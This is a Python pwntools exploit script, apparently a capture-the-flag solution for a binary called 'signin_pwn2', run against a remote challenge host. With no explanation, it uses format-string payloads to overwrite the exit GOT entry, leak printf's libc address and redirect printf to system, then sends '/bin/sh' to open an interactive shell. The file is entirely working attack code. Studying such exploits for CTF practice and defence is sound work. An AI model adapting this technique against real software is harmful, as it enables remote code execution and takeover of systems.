from pwn import *
from pwnlib import fmtstr
rm = 1
proc = ELF('./signin_pwn2')
if rm == 0:
    r = process('./signin_pwn2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r = remote('10.214.160.76', 40218)
    libc = ELF('./libc.so.6')
main = 0x4012cb
# gdb.attach(r)
'''
cb 203

d0 208
12 18
40 64
00
00000000
'''


exit_got = proc.got['exit']
puts_got = proc.got['puts']
printf_got = proc.got['printf']
print(hex(printf_got))

# payload = b"%208c%12$hhn%66c%13$hhn%46c%14$hhn%192c%15$hhn%16$nGGGGG" + p64(exit_got) + p64(exit_got + 2) + \
#     p64(exit_got + 4) + p64(exit_got + 6) + p64(exit_got + 8)
payload = b"%203c%12$hhn%71c%13$hhn%46c%14$hhn%192c%15$hhnG\x00" + p64(exit_got) + p64(exit_got + 1) + \
    p64(exit_got + 2) + p64(exit_got + 3)

r.recv()
r.send(payload)
# print(1, r.recv())

payload = b"%7$sGGGG" + p64(printf_got)
sleep(1)
r.recv()
r.send(payload)
sleep(1)
data = r.recv()
print(data)
index = data.find(b'you, ')
content = data[index+5:index+11]
print(content)
context(arch='amd64', os='linux')
printf_addr = int.from_bytes(content,'little')
system_addr = printf_addr - libc.symbols['printf'] + libc.symbols['system']
print(hex(system_addr))
payload = fmtstr.fmtstr_payload(6, {printf_got: system_addr},
                      numbwritten=0, write_size='short')
print(payload)
r.send(payload)
r.send(b'/bin/sh\x00')
r.interactive()